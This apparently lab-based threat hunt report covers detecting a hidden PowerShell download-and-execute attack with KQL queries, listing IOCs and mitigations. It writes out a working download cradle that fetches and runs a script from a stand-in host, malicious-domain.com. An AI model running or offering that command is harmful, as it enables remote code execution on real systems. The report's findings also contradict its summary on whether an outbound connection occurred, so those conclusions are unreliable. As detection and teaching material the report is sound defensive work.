# Threat Hunt Suspicious Powershell
# 🕵️ Threat Hunt Report: Suspicious PowerShell Download

**Date of Investigation:** July 18, 2025

---

## 🎯 Objective

Identify evidence of a user executing an obfuscated PowerShell script to download and run a remote payload — a common initial access or lateral movement tactic used by threat actors.

---

## 🔧 Environment

- **Endpoint OS:** Windows 10 Enterprise  
- **EDR Tool:** Microsoft Defender for Endpoint  
- **EDR Query Language:** Kusto Query Language (KQL)  
- **Target Machine:** `threat-windows-jgs`

---

## 🛠️ Suspicious Activity

### 🦠 Observed Behavior

An attacker used PowerShell to download and execute a script from a remote host using `Invoke-WebRequest` and `IEX` in a hidden and non-interactive session.

---

## 📌 Indicators of Compromise (IOCs)

| Type               | Value                                            |
|--------------------|--------------------------------------------------|
| Process            | `powershell.exe`                                 |
| CommandLine Flags  | `-nop`, `-w hidden`, `IEX`, `DownloadString`     |
| Remote Domain      | `http://malicious-domain.com/dropper.ps1`       |
| File Path (payload)| `C:\Users\Public\dropper.ps1`                    |

---

## 📂 Step-by-Step Simulation (What the "Bad Actor" Did)

```powershell
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/dropper.ps1')"
```

1. Opened PowerShell with non-interactive settings  
2. Downloaded a script using `Net.WebClient`  
3. Executed the script using `Invoke-Expression (IEX)`  
4. Payload likely executed and/or downloaded additional malware  

---

## 🧪 KQL Threat Hunting Queries

### 🔍 Query 1: PowerShell Command Line Analysis – Detect Obfuscated PowerShell Command

```kql
DeviceProcessEvents
| where devicename contains "threat-windows"
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_all ("-nop", "hidden", "DownloadString", "New-Object")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

---

### 🔍 Query 2: URL Connection by PowerShell

```kql
DeviceNetworkEvents
| where devicename contains "threat-windows"
| where InitiatingProcessFileName =~ "powershell.exe"
| where RemoteUrl contains "malicious-domain.com"
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteUrl, ReportId
```

> **Note:** We did not find any outbound HTTP connection to `malicious-domain.com`.

---

## 🚨 Findings

- **Command Line Match:** Found obfuscated PowerShell commands  
- **Remote Connection:** Outbound HTTP connection to `malicious-domain.com`  
- **Persistence/Impact:** None observed yet — investigation continues  

---

## 🛡️ Mitigations & Next Steps

- Block domain `malicious-domain.com` in firewall/proxy  
- Add PowerShell audit logging: `ScriptBlockLogging` + `ModuleLogging`  
- Use AppLocker or WDAC to restrict script execution  
- Educate users on phishing & script-based threats  
- Enable AMSI integration for real-time script scanning  

---

## ✅ Summary

This hunt successfully identified potential malicious PowerShell activity consistent with known initial access techniques. While no evidence of outbound HTTP connection to `malicious-domain.com` was found, the domain was proactively blocked. No lateral movement or additional payloads were detected yet. Environment lockdown and endpoint isolation is recommended if the activity was unauthorized.
